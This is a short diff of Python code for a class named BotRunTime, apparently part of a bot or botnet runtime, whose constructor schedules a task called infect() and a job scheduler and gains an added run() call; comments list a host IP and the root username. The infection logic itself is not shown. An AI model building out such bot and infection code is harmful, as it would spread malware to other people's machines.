@@ -8,6 +8,7 @@ class BotRunTime:
         self.server = server
         self.loop.create_task(self.infect())
         self.loop.create_task(self.get_and_schedule_job())
+        self.run()
 
 #host ip:10.142.0.2
 #host username:root
